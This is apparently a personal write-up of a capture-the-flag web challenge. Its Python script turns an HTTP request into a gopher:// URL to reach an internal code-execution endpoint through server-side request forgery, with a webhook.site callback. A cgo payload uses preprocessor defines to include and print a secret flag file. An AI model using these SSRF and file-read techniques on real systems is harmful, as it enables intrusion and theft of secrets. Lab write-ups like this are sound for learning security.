---
created: 2025-06-08T12:11
updated: 2025-06-08T12:16
unsolved: true
---

Couldn't solve it, however I think I got pretty close.

I have figured out how to make the server compile some random Go code I give it.

```python
import requests
import urllib


def http_request_to_gopher_url(host: str, port: int, raw_request: str) -> str:
    normalized = raw_request.replace('\r\n', '\n')
    lines = normalized.split('\n')
    normalized = "\r\n".join(lines)
    if not normalized.endswith("\r\n\r\n"):
        normalized += "\r\n\r\n"
    encoded_request = urllib.parse.quote(normalized, safe='')
    gopher_url = f"gopher://{host}:{port}/_{encoded_request}"
    return gopher_url


def build_raw_http_request(method: str, url: str, headers: dict = None, body: str = None) -> str:
    req = requests.Request(method=method, url=url, headers=headers, data=body)
    prep: requests.PreparedRequest = requests.Session().prepare_request(req)
    request_line = f"{prep.method} {prep.path_url} HTTP/1.1\r\n"
    header_lines = ""
    for key, value in prep.headers.items():
        header_lines += f"{key}: {value}\r\n"
    raw_request = request_line + header_lines + "\r\n"
    if prep.body:
        if isinstance(prep.body, bytes):
            raw_request += prep.body.decode('utf-8')
        else:
            raw_request += str(prep.body)
    if not raw_request.endswith("\r\n\r\n"):
        raw_request += "\r\n\r\n"
    return raw_request


target = "http://challs.nusgreyhats.org:33203"


payload = {
    "agentUrl": "https://webhook.site/040b3747-dc9c-48c0-b219-2de560eac4f0"
}


response = requests.post(target+"/register", json=payload)
uuid1 = response.text
print(f"first user uuid: {uuid1}")

code_payload = """
package main
import "fmt"

func main() {
    fmt.Println("Hello, world!")
}
// DUMMY CODE TO MAKE THE AGENT RUN
""".strip()

raw = build_raw_http_request("POST", f"http://127.0.0.1:8080/agent/{uuid1}/execute", headers={
    "Host": "127.0.0.1:8080",
}, body=code_payload)
gopher_url = http_request_to_gopher_url("127.0.0.1", 8080, raw)


payload['agentUrl'] = gopher_url
response = requests.post(target+"/register", json=payload)
uuid2 = response.text
print(f"second user uuid: {uuid2}")
```

---

After the CTF ended, I realized that the intended solution is to write C code in Go.

```c
package secrets

var Flag = "grey{5n34ky_60ph3r}";
```

The above can be made into valid C code using some defines.

```c
#define package 
#define secrets 
#define var char*
#include "/app/secrets/flag.go"
```

So the final payload would be:

```go
package main

/*
#define package 
#define secrets 
#define var char*
#include "/app/secrets/flag.go"
#include <stdio.h>
void printflag() {
    puts(Flag);
}
*/
import "C"

func main() {
    C.printflag()
}
```

And someone even backdoored the Go compiler itself damn.
